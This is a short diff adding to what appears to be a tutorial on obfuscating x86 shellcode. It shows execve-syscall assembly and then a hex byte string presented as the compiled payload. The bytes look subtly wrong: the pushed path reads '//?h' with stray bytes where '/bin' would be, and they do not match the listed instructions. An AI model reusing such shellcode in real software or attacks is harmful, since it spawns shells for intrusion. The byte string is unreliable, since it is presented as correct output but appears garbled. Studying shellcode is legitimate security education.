@@ -28,3 +28,6 @@ To obfuscate the shellcode we can expand some of the instructions so they seem d
     mov ebx, esp ; stores executable path in ebx
     int 0x80 ; init syscall
 
+After compiling and linking we get the following code:
+    "\x31\xc0\x89\xc2\x89\xc1\xb0\x0b\x52\x68\x2f\x2f\x3f\x68\x68\x2f\xff\xe3\x06\x89\xe3\xcd\x80"
+
